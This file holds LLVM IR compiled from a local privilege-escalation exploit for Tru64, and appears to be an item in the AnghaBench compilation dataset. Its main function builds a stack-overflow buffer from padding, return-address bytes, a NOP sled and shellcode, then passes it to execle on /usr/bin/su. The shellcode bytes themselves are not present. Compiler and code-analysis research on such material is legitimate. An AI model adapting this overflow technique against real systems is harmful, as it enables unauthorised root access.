; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/tru64/local/extr_259.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/tru64/local/extr_259.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@retaddr = common dso_local global i32* null, align 8
@rawcode = common dso_local global i64 0, align 8
@nop = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [12 x i8] c"/usr/bin/su\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"su\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [2 x i8*], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUFSIZE, align 4
  %13 = add nsw i32 %12, 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %6, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %7, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %30

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i64 @atoi(i8* %22)
  %24 = load i32*, i32** @retaddr, align 8
  %25 = getelementptr inbounds i32, i32* %24, i64 0
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  %28 = add nsw i64 %27, %23
  %29 = trunc i64 %28 to i32
  store i32 %29, i32* %25, align 4
  br label %30

30:                                               ; preds = %19, %2
  %31 = bitcast i8* %16 to i8**
  %32 = load i32, i32* @BUFSIZE, align 4
  %33 = sub nsw i32 %32, 8
  %34 = call i32 @memset(i8** %31, i8 signext 65, i32 %33)
  %35 = load i32, i32* @BUFSIZE, align 4
  %36 = sub nsw i32 %35, 8
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %16, i64 %37
  store i8* %38, i8** %9, align 8
  store i32 0, i32* %11, align 4
  br label %39

39:                                               ; preds = %51, %30
  %40 = load i32, i32* %11, align 4
  %41 = icmp slt i32 %40, 8
  br i1 %41, label %42, label %54

42:                                               ; preds = %39
  %43 = load i32*, i32** @retaddr, align 8
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i32, i32* %43, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = trunc i32 %47 to i8
  %49 = load i8*, i8** %9, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %9, align 8
  store i8 %48, i8* %49, align 1
  br label %51

51:                                               ; preds = %42
  %52 = load i32, i32* %11, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %11, align 4
  br label %39

54:                                               ; preds = %39
  %55 = load i64, i64* @rawcode, align 8
  %56 = inttoptr i64 %55 to i8*
  store i8* %56, i8** %10, align 8
  store i8* %16, i8** %9, align 8
  store i32 0, i32* %11, align 4
  br label %57

57:                                               ; preds = %63, %54
  %58 = load i32, i32* %11, align 4
  %59 = icmp slt i32 %58, 8
  br i1 %59, label %60, label %66

60:                                               ; preds = %57
  %61 = load i8*, i8** %9, align 8
  %62 = getelementptr inbounds i8, i8* %61, i32 1
  store i8* %62, i8** %9, align 8
  store i8 110, i8* %61, align 1
  br label %63

63:                                               ; preds = %60
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %11, align 4
  br label %57

66:                                               ; preds = %57
  store i32 0, i32* %11, align 4
  br label %67

67:                                               ; preds = %78, %66
  %68 = load i32, i32* %11, align 4
  %69 = icmp slt i32 %68, 72
  br i1 %69, label %70, label %81

70:                                               ; preds = %67
  %71 = load i8*, i8** %10, align 8
  %72 = load i32, i32* %11, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = load i8*, i8** %9, align 8
  %77 = getelementptr inbounds i8, i8* %76, i32 1
  store i8* %77, i8** %9, align 8
  store i8 %75, i8* %76, align 1
  br label %78

78:                                               ; preds = %70
  %79 = load i32, i32* %11, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %11, align 4
  br label %67

81:                                               ; preds = %67
  store i32 0, i32* %11, align 4
  br label %82

82:                                               ; preds = %95, %81
  %83 = load i32, i32* %11, align 4
  %84 = icmp slt i32 %83, 320
  br i1 %84, label %85, label %98

85:                                               ; preds = %82
  %86 = load i32*, i32** @nop, align 8
  %87 = load i32, i32* %11, align 4
  %88 = srem i32 %87, 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i32, i32* %86, i64 %89
  %91 = load i32, i32* %90, align 4
  %92 = trunc i32 %91 to i8
  %93 = load i8*, i8** %9, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %9, align 8
  store i8 %92, i8* %93, align 1
  br label %95

95:                                               ; preds = %85
  %96 = load i32, i32* %11, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %11, align 4
  br label %82

98:                                               ; preds = %82
  %99 = load i8*, i8** %10, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 72
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = sub nsw i32 %102, 80
  %104 = trunc i32 %103 to i8
  %105 = load i8*, i8** %9, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %9, align 8
  store i8 %104, i8* %105, align 1
  store i32 1, i32* %11, align 4
  br label %107

107:                                              ; preds = %119, %98
  %108 = load i32, i32* %11, align 4
  %109 = icmp slt i32 %108, 8
  br i1 %109, label %110, label %122

110:                                              ; preds = %107
  %111 = load i8*, i8** %10, align 8
  %112 = load i32, i32* %11, align 4
  %113 = add nsw i32 %112, 72
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %111, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %9, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 1
  store i8* %118, i8** %9, align 8
  store i8 %116, i8* %117, align 1
  br label %119

119:                                              ; preds = %110
  %120 = load i32, i32* %11, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %11, align 4
  br label %107

122:                                              ; preds = %107
  %123 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 1
  store i8* null, i8** %123, align 8
  %124 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 0
  %125 = call i32 @execle(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %16, i32* null, i8** %124)
  store i32 0, i32* %3, align 4
  %126 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %126)
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memset(i8**, i8 signext, i32) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i8**) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
